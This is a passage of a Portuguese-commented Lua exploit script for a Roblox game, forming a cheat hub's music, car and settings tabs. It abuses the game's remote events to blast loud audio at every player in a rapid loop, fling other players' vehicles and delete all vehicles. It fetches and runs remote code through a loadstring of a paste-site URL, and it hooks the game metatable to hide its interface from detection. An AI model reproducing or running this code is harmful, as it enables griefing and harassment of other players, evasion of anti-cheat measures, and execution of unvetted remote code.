COFFCOFF", ID = 7056720271},\n    {Name = "SUS", ID = 7153419575},\n    {Name = "Sonic.exe", ID = 2496367477},\n    {Name = "Tubers93 1", ID = 270145703},\n    {Name = "Tubers93 2", ID = 18131809532},\n    {Name = "John\'s Laugh", ID = 130759239},\n    {Name = "Nao sei KKKK", ID = 6549021381},\n    {Name = "Grito", ID = 80156405968805},\n    {Name = "audio estranho", ID = 7705506391},\n    {Name = "AAAH", ID = 7772283448},\n    {Name = "Gay, gay", ID = 18786647417},\n    {Name = "Bat Hit", ID = 7129073354},\n    {Name = "Nuclear Siren", ID = 675587093},\n    {Name = "Sem ideia de nome KK", ID = 7520729342},\n    {Name = "Grito 2", ID = 91412024101709},\n    {Name = "Estora t\237mpano", ID = 268116333},\n    {Name = "[ Content Deleted ]", ID = 106835463235574},\n    {Name = "Toma Jack", ID = 132603645477541},\n    {Name = "Pede ifood pede", ID = 133843750864059},\n    {Name = "I Ghost The down", ID = 84663543883498},\n    {Name = "Compre OnLine Na shoope", ID = 8747441609},\n    {Name = "Uh Que Nojo", ID = 103440368630269},\n    {Name = "Sai dai Lava Prato", ID = 101232400175829},\n    {Name = "Seloko num compensa", ID = 78442476709262},\n    {Name = "(EM BREVE)  FUNK", ID = 124348034550602},\n    {Name = "Candyland - Tobu", ID = 118939739460633},\n    {Name = "Meme do Dom pollo What the hell", ID = 100656590080703},\n    {Name = "n\227o to entendendo nd meme estourado", ID = 7962533987},\n}\n\nlocal selectedAudioID\n\n-- Adicionar uma textbox para inserir o ID do \225udio\nTabmusic:AddTextBox({\n    Name = "Insira o ID do \193udio ou Musica",\n    Description = "Digite o ID do \225udio",\n    PlaceholderText = "ID do \225udio",\n    Callback = function(value)\n        selectedAudioID = tonumber(value)\n    end\n})\n\n-- Adicionar uma dropdown para selecionar o \225udio\nlocal audioNames = {}\nfor _, audio in ipairs(audios) do\n    table.insert(audioNames, audio.Name)\nend\n\nTabmusic:AddDropdown({\n    Name = "SELECIONE \193UDIO",\n    Description = "Escolha um \225udio da lista",\n    Options = audioNames,\n    Default = audioNames[1],\n    Flag = "selected_audio",\n    Callback = function(value)\n        for _, audio in ipairs(audios) do\n            if audio.Name == value then\n                selectedAudioID = audio.ID\n                break\n            end\n        end\n    end\n})\n\n-- Controle do loop\nlocal audioLoop = false\n\n-- Nova se\231\227o para loop de \225udio\nTabmusic:AddSection({"LOOP DE AUDIO"})\n\n-- Fun\231\227o para tocar o \225udio repetidamente\nlocal function playLoopedAudio()\n    while audioLoop do\n        if selectedAudioID then\n            local args = {\n                [1] = game:GetService("Workspace"),\n                [2] = selectedAudioID,\n                [3] = 1,\n            }\n            game:GetService("ReplicatedStorage").RE:FindFirstChild("1Gu1nSound1s"):FireServer(unpack(args))\n\n            -- Criar e tocar o \225udio\n            local sound = Instance.new("Sound")\n            sound.SoundId = "rbxassetid://" .. selectedAudioID\n            sound.Parent = game.Players.LocalPlayer.Character.HumanoidRootPart\n            sound:Play()\n        else\n            warn("Nenhum \225udio selecionado!")\n        end\n\n        task.wait(0.5) -- Pequeno delay para evitar sobrecarga\n    end\nend\n\n-- Toggle para loop de \225udio\nTabmusic:AddToggle({\n    Name = "REPETIR  \193UDIO",\n    Default = false,\n    Flag = "audio_loop",\n    Callback = function(value)\n        audioLoop = value\n        if audioLoop then\n            task.spawn(playLoopedAudio) -- Inicia o loop em uma nova thread\n        end\n    end\n})\n\n\n\n-- Fun\231\227o para tocar o \225udio normal\nlocal function playAudio()\n    if selectedAudioID then\n        local args = {\n            [1] = game:GetService("Workspace"),\n            [2] = selectedAudioID,\n            [3] = 1,\n        }\n        game:GetService("ReplicatedStorage").RE:FindFirstChild("1Gu1nSound1s"):FireServer(unpack(args))\n\n        -- Criar e tocar o \225udio\n        local sound = Instance.new("Sound")\n        sound.SoundId = "rbxassetid://" .. selectedAudioID\n        sound.Parent = game.Players.LocalPlayer.Character.HumanoidRootPart\n        sound:Play()\n    else\n        warn("Nenhum \225udio selecionado!")\n    end\nend\n\n\n-- Bot\227o para tocar o \225udio\nTabmusic:AddButton({"TOCA \193UDIO", function()\n    playAudio()\nend})\n\nlocal ReplicatedStorage = game:GetService("ReplicatedStorage")\nlocal audioID = 6314880174 -- ID fixo do \225udio\n\nlocal function Audio_All_ClientSide(ID)\n    local function CheckFolderAudioAll()\n        local FolderAudio = workspace:FindFirstChild("Audio all client")\n        if not FolderAudio then\n            FolderAudio = Instance.new("Folder")\n            FolderAudio.Name = "Audio all client"\n            FolderAudio.Parent = workspace\n        end\n        return FolderAudio\n    end\n\n    local function CreateSound(ID)\n        if type(ID) ~= "number" then\n            print("Insira um n\250mero v\225lido!")\n            return nil\n        end\n\n        local Folder_Audio = CheckFolderAudioAll()\n        if Folder_Audio then\n            local Sound = Instance.new("Sound")\n            Sound.SoundId = "rbxassetid://" .. ID\n            Sound.Volume = 1\n            Sound.Looped = false\n            Sound.Parent = Folder_Audio\n            Sound:Play()\n            task.wait(1) -- Tempo de espera antes de remover o som\n            Sound:Destroy()\n        end\n    end\n\n    CreateSound(ID)\nend\n\nlocal function Audio_All_ServerSide(ID)\n    if type(ID) ~= "number" then\n        print("Insira um n\250mero v\225lido!")\n        return nil\n    end\n\n    local GunSoundEvent = ReplicatedStorage:FindFirstChild("1Gu1nSound1s", true)\n    if GunSoundEvent then\n        GunSoundEvent:FireServer(workspace, ID, 1)\n    end\nend\n\n-- Toggle para "Estorar ouvido de geral"\nTabmusic:AddToggle({\n    Name = " \193UDIO ESTOURADO EM TODOS",\n    Description = "Toca \225udio repetidamente para todos",\n    Default = false,\n    Flag = "audio_spam",\n    Callback = function(value)\n        getgenv().Audio_All_loop_fast = value\n\n        while getgenv().Audio_All_loop_fast do\n            Audio_All_ServerSide(audioID)\n            task.spawn(function()\n                Audio_All_ClientSide(audioID)\n            end)\n            task.wait(0.03) -- Delay extremamente r\225pido (0.03 segundos)\n        end\n    end\n})\n\n\n\nCarTab:AddButton({\n    Name = "FLY CAR",\n    Callback = function()\n    loadstring(game:HttpGet("https://pastefy.app/RtliHFjP/raw"))()\n    end\n})\n\nCarTab:AddToggle({\n    Name = "AUTO REMOVER VE\205CULO",\n    Description = "REMOVE TODOS VE\205CULO",\n    Callback = function(state)\n        if state then\n            -- Loop principal para remover ve\237culos\n            spawn(function()\n                while getgenv().AutoRemoveVehicles do\n                    pcall(function()\n                        -- Percorre todos os ve\237culos no jogo\n                        for _, vehicle in pairs(game:GetService("Workspace").Vehicles:GetChildren()) do\n                            if vehicle:IsA("Model") and vehicle:FindFirstChild("Humanoid") == nil then\n                                -- Remove o ve\237culo\n                                vehicle:Destroy()\n                            end\n                        end\n                        \n                        -- Remove tamb\233m ve\237culos no ch\227o\n                        for _, obj in pairs(game:GetService("Workspace").Parts:GetChildren()) do\n                            if obj:IsA("Part") and obj.Name:lower():find("vehicle") or obj.Name:lower():find("car") then\n                                obj:Destroy()\n                            end\n                        end\n                    end)\n                    wait(0.5) -- Delay para n\227o sobrecarregar\n                end\n            end)\n            \n            -- Conex\227o para novos ve\237culos que spawnarem\n            local vehicleAddedConnection\n            vehicleAddedConnection = game:GetService("Workspace").ChildAdded:Connect(function(child)\n                if getgenv().AutoRemoveVehicles then\n                    task.wait(0.1)\n                    pcall(function()\n                        if child:IsA("Model") and child:FindFirstChild("Humanoid") == nil then\n                            child:Destroy()\n                        elseif child:IsA("Part") and (child.Name:lower():find("vehicle") or child.Name:lower():find("car")) then\n                            child:Destroy()\n                        end\n                    end)\n                else\n                    vehicleAddedConnection:Disconnect()\n                end\n            end)\n            \n            -- Vari\225vel global para controle\n            getgenv().AutoRemoveVehicles = true\n            \n        else\n            -- Desativa a remo\231\227o\n            getgenv().AutoRemoveVehicles = false\n        end\n    end,\n})\n\nCarTab:AddButton({\n    Name = "REMOVE TODOS CARROS",\n    Callback = function()\n        local ofnawufn = false\n\nif ofnawufn == true then\n    return\nend\nofnawufn = true\n\nlocal cawwfer = "MilitaryBoatFree" -- Alterado para MilitaryBoatFree\nlocal oldcfffff = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame\ngame.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(1754, -2, 58) -- Coordenadas atualizadas\nwait(0.3)\n\nlocal args = {\n    [1] = "PickingBoat", -- Alterado para PickingBoat\n    [2] = cawwfer\n}\n\ngame:GetService("ReplicatedStorage").RE:FindFirstChild("1Ca1r"):FireServer(unpack(args))\nwait(1)\n\nlocal wrinfjn\nfor _, errb in pairs(game.workspace.Vehicles[game.Players.LocalPlayer.Name.."Car"]:GetDescendants()) do\n    if errb:IsA("VehicleSeat") then\n        wrinfjn = errb\n    end\nend\n\nrepeat\n    if game.Players.LocalPlayer.Character.Humanoid.Health == 0 then return end\n    if game.Players.LocalPlayer.Character.Humanoid.Sit == true then\n        if not game.Players.LocalPlayer.Character.Humanoid.SeatPart == wrinfjn then\n            game.Players.LocalPlayer.Character.Humanoid.Sit = false\n        end\n    end\n    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = wrinfjn.CFrame\n    task.wait()\n    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = wrinfjn.CFrame + Vector3.new(0,1,0)\n    task.wait()\n    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = wrinfjn.CFrame + Vector3.new(0,-1,0)\n    task.wait()\nuntil game.Players.LocalPlayer.Character.Humanoid.SeatPart == wrinfjn\n\nfor _, wifn in pairs(game.workspace.Vehicles[game.Players.LocalPlayer.Name.."Car"]:GetDescendants()) do\n    if wifn.Name == "PhysicalWheel" then\n        wifn:Destroy()\n    end\nend\n\nlocal FLINGED = Instance.new("BodyThrust", game.workspace.Vehicles[game.Players.LocalPlayer.Name.."Car"].Chassis.Mass) \nFLINGED.Force = Vector3.new(50000, 0, 50000) \nFLINGED.Name = "SUNTERIUM HUB FLING"\nFLINGED.Location = game.workspace.Vehicles[game.Players.LocalPlayer.Name.."Car"].Chassis.Mass.Position\n\nfor _, wvwvwasc in pairs(game.workspace.Vehicles:GetChildren()) do\n    for _, ascegr in pairs(wvwvwasc:GetDescendants()) do\n        if ascegr.Name == "VehicleSeat" then\n            local targetcar = ascegr\n            local tet = Instance.new("BodyVelocity", game.workspace.Vehicles[game.Players.LocalPlayer.Name.."Car"].Chassis.Mass)\n            tet.MaxForce = Vector3.new(math.huge,math.huge,math.huge)\n            tet.P = 1250\n            tet.Velocity = Vector3.new(0,0,0)\n            tet.Name = "#mOVOOEPF$#@F$#GERE..>V<<<<EW<V<<W"\n            for m=1,25 do\n                local pos = {x=0, y=0, z=0}\n                pos.x = targetcar.Position.X\n                pos.y = targetcar.Position.Y\n                pos.z = targetcar.Position.Z\n                pos.x = pos.x + targetcar.Velocity.X / 2\n                pos.y = pos.y + targetcar.Velocity.Y / 2\n                pos.z = pos.z + targetcar.Velocity.Z / 2\n                if pos.y <= -200 then\n                    game.workspace.Vehicles[game.Players.LocalPlayer.Name.."Car"].Chassis.Mass.CFrame = CFrame.new(0,1000,0)\n                else\n                    game.workspace.Vehicles[game.Players.LocalPlayer.Name.."Car"].Chassis.Mass.CFrame = CFrame.new(Vector3.new(pos.x,pos.y,pos.z))\n                    task.wait()\n                    game.workspace.Vehicles[game.Players.LocalPlayer.Name.."Car"].Chassis.Mass.CFrame = CFrame.new(Vector3.new(pos.x,pos.y,pos.z)) + Vector3.new(0,-2,0)\n                    task.wait()\n                    game.workspace.Vehicles[game.Players.LocalPlayer.Name.."Car"].Chassis.Mass.CFrame = CFrame.new(Vector3.new(pos.x,pos.y,pos.z)) * CFrame.new(0,0,2)\n                    task.wait()\n                    game.workspace.Vehicles[\ngame.Players.LocalPlayer.Name.."Car"].Chassis.Mass.CFrame = CFrame.new(Vector3.new(pos.x,pos.y,pos.z)) * CFrame.new(2,0,0)\n                    task.wait()\n                end\n                task.wait()\n            end\n        end\n    end\nend\n\ntask.wait()\nlocal args = {\n    [1] = "DeleteAllVehicles"\n}\n\ngame:GetService("ReplicatedStorage").RE:FindFirstChild("1Ca1r"):FireServer(unpack(args))\ngame.Players.LocalPlayer.Character.Humanoid.Sit = false\nwait()\nlocal tet = Instance.new("BodyVelocity", game.Players.LocalPlayer.Character.HumanoidRootPart)\ntet.MaxForce = Vector3.new(math.huge,math.huge,math.huge)\ntet.P = 1250\ntet.Velocity = Vector3.new(0,0,0)\ntet.Name = "#mOVOOEPF$#@F$#GERE..>V<<<<EW<V<<W"\nwait(0.1)\nfor m=1,2 do \n    task.wait()\n    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = oldcfffff\nend\nwait(1)\ngame.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = oldcfffff\nwait()\ngame.Players.LocalPlayer.Character.HumanoidRootPart:FindFirstChild("#mOVOOEPF$#@F$#GERE..>V<<<<EW<V<<W"):Destroy()\nwait(0.2)\nofnawufn = false\n    end\n})\n\n\nCarTab:AddToggle({\n    Name = "CARRO RGB",\n    Default = false,\n    Callback = function(Value)\n        isColorChanging = Value\n\n        if isColorChanging then\n            colorChangeCoroutine = coroutine.create(function()\n                while isColorChanging do\n                    for _, color in ipairs(colors) do\n                        if not isColorChanging then return end\n                        local args = {\n                            [1] = "PickingCarColor",\n                            [2] = color\n                        }\n                        remoteEvent:FireServer(unpack(args))\n                        wait(1)\n                    end\n                end\n            end)\n            coroutine.resume(colorChangeCoroutine)\n        end\n    end\n})\n\n-- Cores RGB\nlocal colors = {\n    Color3.new(1, 0, 0),     -- Vermelho\n    Color3.new(0, 1, 0),     -- Verde\n    Color3.new(0, 0, 1),     -- Azul\n    Color3.new(1, 1, 0),     -- Amarelo\n    Color3.new(1, 0, 1),     -- Magenta\n    Color3.new(0, 1, 1),     -- Ciano\n    Color3.new(0.5, 0, 0.5), -- Roxo\n    Color3.new(1, 0.5, 0)    -- Laranja\n}\n\n-- Servi\231o e RemoteEvent\nlocal replicatedStorage = game:GetService("ReplicatedStorage")\nlocal remoteEvent = replicatedStorage:WaitForChild("RE"):WaitForChild("1Player1sCa1r")\n\n\n\n\n\nTabconfg:AddSection({ Name = "CONFIG" })\n\nTabconfg:AddTextBox({\n    Name = "ENTRAR NO SERVIDOR",\n    PlaceholderText = "DIGITE O ID DO SERVIDOR",\n    Callback = function(serverId)\n        if typeof(serverId) == "string" and serverId ~= "" then\n            local TeleportService = game:GetService("TeleportService")\n            local placeId = game.PlaceId\n\n            TeleportService:TeleportToPlaceInstance(placeId, serverId, game.Players.LocalPlayer)\n        else\n            warn("ID do servidor inv\225lido.")\n        end\n    end\n})\n\nTabconfg:AddButton({\n    Name = "COPIAR ID DO SERVIDOR",\n    Callback = function()\n        local serverId = tostring(game.JobId or "")\n        if setclipboard then\n            setclipboard(serverId)\n        end\n    end\n})\n\nTabconfg:AddButton({\n    Name = "SHIFT LOK",\n    Callback = function()\n        local shiftlockk = Instance.new("ScreenGui")\nlocal LockButton = Instance.new("ImageButton")\nlocal btnIcon = Instance.new("ImageLabel")\nlocal buttonEffect = Instance.new("UICorner")\nlocal buttonStroke = Instance.new("UIStroke")\nlocal closeButton = Instance.new("TextButton")\nlocal closeEffect = Instance.new("UICorner")\nlocal closeStroke = Instance.new("UIStroke")\n\nfunction protectUI(sGui)\n    local function blankfunction(...)\n        return ...\n    end\n    local cloneref = cloneref or blankfunction\n    local function SafeGetService(service)\n        return cloneref(game:GetService(service)) or game:GetService(service)\n    end\n    local cGUI = SafeGetService("CoreGui")\n    local rPlr = SafeGetService("Players"):FindFirstChildWhichIsA("Player")\n    local cGUIProtect = {}\n    local rService = SafeGetService("RunService")\n    local lPlr = SafeGetService("Players").LocalPlayer\n    local function NAProtection(inst, var)\n        if inst then\n            if var then\n                inst[var] = "\\0"\n                inst.Archivable = false\n            else\n                inst.Name = "\\0"\n                inst.Archivable = false\n            end\n        end\n    end\n    if (get_hidden_gui or gethui) then\n        local hiddenUI = (get_hidden_gui or gethui)\n        NAProtection(sGui)\n        sGui.Parent = hiddenUI()\n        return sGui\n    elseif (not is_sirhurt_closure) and (syn and syn.protect_gui) then\n        NAProtection(sGui)\n        syn.protect_gui(sGui)\n        sGui.Parent = cGUI\n        return sGui\n    elseif cGUI:FindFirstChildWhichIsA("ScreenGui") then\n        pcall(function()\n            for _, v in pairs(sGui:GetDescendants()) do\n                cGUIProtect[v] = rPlr.Name\n            end\n            sGui.DescendantAdded:Connect(function(v)\n                cGUIProtect[v] = rPlr.Name\n            end)\n            cGUIProtect[sGui] = rPlr.Name\n            local meta = getrawmetatable(game)\n            local tostr = meta.__tostring\n            setreadonly(meta, false)\n            meta.__tostring = newcclosure(function(t)\n                if cGUIProtect[t] and not checkcaller() then\n                    return cGUIProtect[t]\n                end\n                return tostr(t)\n            end)\n        end)\n        if not rService:IsStudio() then\n            local newGui = cGUI:FindFirstChildWhichIsA("ScreenGui")\n            newGui.DescendantAdded:Connect(function(v)\n                cGUIProtect[v] = rPlr.Name\n            end)\n            for _, v in pairs(sGui:GetChildren()) do\n                v.Parent = newGui\n            end\n            sGui = newGui\n        end\n        return sGui\n    elseif cGUI then\n        NAProtection(sGui)\n        sGui.Parent = cGUI\n        return sGui\n    elseif lPlr and lPlr:FindFirstChild("PlayerGui") then\n        NAProtection(sGui)\n        sGui.Parent = lPlr:FindFirstChild("PlayerGui")\n        return sGui\n    else\n        return nil\n    end\nend\n\nshiftlockk.Name = "shiftlockk"\nprotectUI(shiftlockk)\nshiftlockk.ZIndexBehavior = Enum.ZIndexBehavior.Sibling\nshiftlockk.ResetOnSpawn = false\nshiftlockk.DisplayOrder = 69\n\nLockButton.Name = "LockButton"\nLockButton.Parent = shiftlockk\nLockButton.AnchorPoint = Vector2.new(0.5, 0.5)\nLockButton.BackgroundColor3 = Color3.fromRGB(40, 40, 40)\nLockButton.BackgroundTransparency = 0.3\nLockButton.BorderColor3 = Color3.fromRGB(27, 42, 53)\nLockButton.BorderSizePixel = 0\nLockButton.Position = UDim2.new(0.785148501, 0, 0.865914762, 0)\nLockButton.Size = UDim2.new(0, 65, 0, 65)\nLockButton.ZIndex = 3\nLockButton.Image = ""\nLockButton.AutoButtonColor = true\n\nbuttonEffect.Parent = LockButton\nbuttonEffect.CornerRadius = UDim.new(1, 0)\n\nbuttonStroke.Parent = LockButton\nbuttonStroke.Color = Color3.fromRGB(0,255,0)\nbuttonStroke.Thickness = 2\nbuttonStroke.Transparency = 0.3\n\nbtnIcon.Name = "btnIcon"\nbtnIcon.Parent = LockButton\nbtnIcon.BackgroundColor3 = Color3.fromRGB(0, 0, 0)\nbtnIcon.BackgroundTransparency = 1\nbtnIcon.Position = UDim2.new(0.15, 0, 0.15, 0)\nbtnIcon.Size = UDim2.new(0.7, 0, 0.7, 0)\nbtnIcon.ZIndex = 3\nbtnIcon.Image = "rbxasset://textures/ui/mouseLock_off.png"\nbtnIcon.ImageColor3 = Color3.fromRGB(255, 255, 255)\nbtnIcon.ScaleType = Enum.ScaleType.Fit\n\ncloseButton.Name = "CloseButton"\ncloseButton.Parent = LockButton\ncloseButton.AnchorPoint = Vector2.new(1, 0)\ncloseButton.BackgroundColor3 = Color3.fromRGB(255, 0, 0)\ncloseButton.BackgroundTransparency = 0.3\ncloseButton.BorderColor3 = Color3.fromRGB(27, 42, 53)\ncloseButton.BorderSizePixel = 0\ncloseButton.Position = UDim2.new(1, 0, 0, -5)\ncloseButton.Size = UDim2.new(0, 20, 0, 20)\ncloseButton.ZIndex = 4\ncloseButton.Text = "X"\ncloseButton.TextColor3 = Color3.fromRGB(255, 255, 255)\ncloseButton.TextScaled = true\ncloseButton.Font = Enum.Font.SourceSans\ncloseButton.AutoButtonColor = true\n\ncloseEffect.Parent = closeButton\ncloseEffect.CornerRadius = UDim.new(0.5, 0)\n\ncloseStroke.Parent = closeButton\ncloseStroke.Color = Color3.fromRGB(255, 255, 255)\ncloseStroke.Thickness = 1\ncloseStroke.Transparency = 0.3\n\nlocal tweenService = game:GetService("TweenService")\nlocal hoverInfo = TweenInfo.new(0.2, Enum.EasingStyle.Quad, Enum.EasingDirection.Out)\nlocal clickInfo = TweenInfo.new(0.1, Enum.EasingStyle.Quad, Enum.EasingDirection.Out)\n\nlocal defaultProps = {\n    BackgroundTransparency = 0.3,\n    Size = UDim2.new(0, 65, 0, 65)\n}\n\nlocal hoverProps = {\n    BackgroundTransparency = 0.1,\n    Size = UDim2.new(0, 70, 0, 70)\n}\n\nlocal clickProps = {\n    BackgroundTransparency = 0,\n    Size = UDim2.new(0, 60, 0, 60)\n}\n\nlocal defaultTween = tweenService:Create(LockButton, hoverInfo, defaultProps)\nlocal hoverTween = tweenService:Create(LockButton, hoverInfo, hoverProps)\nlocal clickTween = tweenService:Create(LockButton, clickInfo, clickProps)\n\nLockButton.MouseEnter:Connect(function()\n    hoverTween:Play()\nend)\n\nLockButton.MouseLeave:Connect(function()\n    defaultTween:Play()\nend)\n\nLockButton.MouseButton1Down:Connect(function()\n    clickTween:Play()\nend)\n\nLockButton.MouseButton1Up:Connect(function()\n    hoverTween:Play()\nend)\n\nNAdrag = function(ui, dragui)\n    if not dragui then dragui = ui end\n    local UserInputService = game:GetService("UserInputService")\n    local dragging\n    local dragInput\n    local dragStart\n    local startPos\n    local function update(input)\n        local delta = input.Position - dragStart\n        local newXOffset = startPos.X.Offset + delta.X\n        local newYOffset = startPos.Y.Offset + delta.Y\n        local screenSize = ui.Parent.AbsoluteSize\n        local newXScale = startPos.X.Scale + (newXOffset / screenSize.X)\n        local newYScale = startPos.Y.Scale + (newYOffset / screenSize.Y)\n        ui.Position = UDim2.new(newXScale, 0, newYScale, 0)\n    end\n    dragui.InputBegan:Connect(function(input)\n        if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then\n            dragging = true\n            dragStart = input.Position\n            startPos = ui.Position\n            input.Changed:Connect(function()\n                if input.UserInputState == Enum.UserInputState.End then\n                    dragging = false\n                end\n            end)\n        end\n    end)\n    dragui.InputChanged:Connect(function(input)\n        if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then\n            dragInput = input\n        end\n    end)\n    UserInputService.InputChanged:Connect(function(input)\n        if input == dragInput and dragging then\n            update(input)\n        end\n    end)\n    ui.Active = true\nend\n\nNAdrag(LockButton)\n\nlocal function YDYMLAX_fake_script()\n    local script = Instance.new(\'LocalScript\', LockButton)\n    local Input = game:GetService("UserInputService")\n    local V = false\n    local main = script.Parent\n    local buttonStroke = main:FindFirstChildOfClass("UIStroke")\n    main.MouseButton1Click:Connect(function()\n        V = not V\n        if V then\n            main.btnIcon.ImageColor3 = Color3.fromRGB(0, 170, 255)\n            buttonStroke.Color = Color3.fromRGB(0, 170, 255)\n            buttonStroke.Thickness = 3\n            spawn(function()\n                while V do\n                    for i = 0.3, 0.7, 0.1 do\n                        if not V then break end\n                        buttonStroke.Transparency = i\n                        wait(0.1)\n                    end\n                    for i = 0.7, 0.3, -0.1 do\n                        if not V then break end\n                        buttonStroke.Transparency = i\n                        wait(0.1)\n                    end\n                end\n            end)\n            ForceShiftLock()\n        else\n            main.btnIcon.ImageColor3 = Color3.fromRGB(255, 255, 255)\n            buttonStroke.Color = Color3.fromRGB(0,255,0)\n            buttonStroke.Thickness = 2\n            buttonStroke.Transparency = 0.3\n            EndForceShiftLock()\n        end\n    end)\n    if closeButton then\n        closeButton.MouseButton1Click:Connect(function()\n            if V then\n                EndForceShiftLock()\n                V = false\n            end\n            shiftlockk:Destroy()\n        end)\n    end\n    local g = nil\n    local GameSettings = UserSettings():GetService("UserGameSettings")\n    local J = nil\n    function ForceShiftLock()\n        local i, k = pcall(function()\n            return GameSettings.RotationType\n        end)\n        _ = i\n        g = k\n        J = game:GetService("RunService").RenderStepped:Connect(function()\n            pcall(function()\n                GameSettings.RotationType = Enum.RotationType.CameraRelative\n            end)\n        end)\n    end\n    function EndForceShiftLock()\n        if J then\n            pcall(function()\n                GameSettings.RotationType = g or Enum.RotationType.MovementRelative\n            end)\n            J:Disconnect()\n        end\n    end\nend\ncoroutine.wrap(YDYMLAX_fake_script)()\n    end,\n})\n\nTabconfg:AddSection({ Name = "CONFIG FPS" })\n\nTabconfg:AddToggle({\n    Name = "GRAFICO LITE SEM SKIN",\n    Callback = function(state)\n        if state then\n            local Lighting = game:GetService("Lighting")\n            local Workspace = game:GetService("Workspace")\n            local Players = game:GetService("Players")\n            \n            settings().Rendering.QualityLevel = Enum.QualityLevel.Level01\n            \n            Lighting.GlobalShadows = false\n            Lighting.FogEnd = 9e9\n            Lighting.Brightness = 1\n            Lighting.EnvironmentDiffuseScale = 0\n            Lighting.EnvironmentSpecularScale = 0\n            Lighting.Technology = Enum.Technology.Legacy\n\n            -- Remove todos os efeitos de p\243s-processamento\n            for _, v in ipairs(Lighting:GetDescendants()) do\n                if v:IsA("PostEffect") or v:IsA("BloomEffect") or v:IsA("BlurEffect") or v:IsA("ColorCorrectionEffect") or v:IsA("SunRaysEffect") or v:IsA("DepthOfFieldEffect") or v:IsA("Atmosphere") or v:IsA("Sky") then\n                    pcall(function()\n                        v.Enabled = false\n                        if v:IsA("Sky") then v:Destroy() end\n                    end)\n                end\n            end\n            \n            -- Fun\231\227o para limpar objetos\n            local function limparObjeto(obj)\n                if not obj then return end\n                \n                -- Remove efeitos visuais\n                if obj:IsA("ParticleEmitter") or obj:IsA("Trail") or obj:IsA("Smoke") or obj:IsA("Fire") or obj:IsA("Explosion") or obj:IsA("Sparkles") then\n                    obj:Destroy()\n                elseif obj:IsA("Decal") or obj:IsA("Texture") or obj:IsA("BillboardGui") then\n                    obj:Destroy()\n                elseif obj:IsA("Accessory") or obj:IsA("Hat") or obj:IsA("Clothing") then\n                    obj:Destroy()\n                elseif obj:IsA("MeshPart") then\n                    obj.Material = Enum.Material.SmoothPlastic\n                    obj.Reflectance = 0\n                    obj.CastShadow = false\n                elseif obj:IsA("BasePart") then\n                    obj.Material = Enum.Material.SmoothPlastic\n                    obj.CastShadow = false\n                    obj.Reflectance = 0\n                elseif obj:IsA("Model") and obj:FindFirstChild("Handle") then\n                    obj:Destroy()\n                end\n            end\n            \n            -- Limpa o workspace\n            for _, obj in ipairs(Workspace:GetDescendants()) do\n                limparObjeto(obj)\n            end\n            \n            -- Remove anima\231\245es dos jogadores\n            for _, plr in pairs(Players:GetPlayers()) do\n                if plr.Character then\n                    local animator = plr.Character:FindFirstChildOfClass("Animator")\n                    if animator then\n                        for _, animTrack in pairs(animator:GetPlayingAnimationTracks()) do\n                            animTrack:Stop()\n                        end\n                    end\n                    for _, child in pairs(plr.Character:GetChildren()) do\n                        if child:IsA("Accessory") or child:IsA("Clothing") or child:IsA("Shirt") or child:IsA("Pants") then\n                            child:Destroy()\n                        end\n                    end\n                end\n            end\n            \n            -- Monitora novos objetos\n            Workspace.DescendantAdded:Connect(function(obj)\n                task.wait()\n                limparObjeto(obj)\n            end)\n            \n            Lighting.DescendantAdded:Connect(function(obj)\n                if obj:IsA("PostEffect") or obj:IsA("BloomEffect") or obj:IsA("BlurEffect") or obj:IsA("ColorCorrectionEffect") or obj:IsA("SunRaysEffect") or obj:IsA("DepthOfFieldEffect") or obj:IsA("Atmosphere") then\n                    pcall(function()\n                        obj.Enabled = false\n                        task.wait(0.1)\n                        obj:Destroy()\n                    end)\n                end\n            end)\n            \n            -- Remove \225gua\n            for _, v in pairs(Workspace:GetChildren()) do\n                if v:IsA("Terrain") then\n                    v.WaterWaveSize = 0\n                    v.WaterWaveSpeed = 0\n                    v.WaterReflectance = 0\n                    v.WaterTransparency = 1\n                end\n            end\n        end\n    end,\n})\n\nTabconfg:AddToggle({\n    Name = "GRAFICO LITE COM SKIN",\n    Callback = function(state)\n        if state then\n            local Lighting = game:GetService("Lighting")\n            local Workspace = game:GetService("Workspace")\n            local Players = game:GetService("Players")\n            \n            settings().Rendering.QualityLevel = Enum.QualityLevel.Level01\n            \n            Lighting.GlobalShadows = false\n            Lighting.FogEnd = 9e9\n            Lighting.Brightness = 1\n            Lighting.EnvironmentDiffuseScale = 0\n            Lighting.EnvironmentSpecularScale = 0\n            Lighting.Technology = Enum.Technology.Legacy\n\n            -- Remove todos os efeitos de p\243s-processamento\n            for _, v in ipairs(Lighting:GetDescendants()) do\n                if v:IsA("PostEffect") or v:IsA("BloomEffect") or v:IsA("BlurEffect") or v:IsA("ColorCorrectionEffect") or v:IsA("SunRaysEffect") or v:IsA("DepthOfFieldEffect") or v:IsA("Atmosphere") or v:IsA("Sky") then\n                    pcall(function()\n                        v.Enabled = false\n                        if v:IsA("Sky") then v:Destroy() end\n                    end)\n                end\n            end\n            \n            -- Fun\231\227o para limpar objetos (sem remover skins dos jogadores)\n            local function limparObjeto(obj)\n                if not obj then return end\n                \n                -- Remove efeitos visuais\n                if obj:IsA("ParticleEmitter") or obj:IsA("Trail") or obj:IsA("Smoke") or obj:IsA("Fire") or obj:IsA("Explosion") or obj:IsA("Sparkles") then\n                    obj:Destroy()\n                elseif obj:IsA("Decal") or obj:IsA("Texture") or obj:IsA("BillboardGui") then\n                    obj:Destroy()\n                elseif obj:IsA("MeshPart") then\n                    obj.Material = Enum.Material.SmoothPlastic\n                    obj.Reflectance = 0\n                    obj.CastShadow = false\n                elseif obj:IsA("BasePart") then\n                    obj.Material = Enum.Material.SmoothPlastic\n                    obj.CastShadow = false\n                    obj.Reflectance = 0\n                elseif obj:IsA("Model") and obj:FindFirstChild("Handle") then\n                    obj:Destroy()\n                end\n            end\n            \n            -- Limpa o workspace (mas n\227o remove skins)\n            for _, obj in ipairs(Workspace:GetDescendants()) do\n                -- VERIFICA SE N\195O \201 PARTE DO JOGADOR\n                local isPlayerPart = false\n                for _, plr in pairs(Players:GetPlayers()) do\n                    if plr.Character and 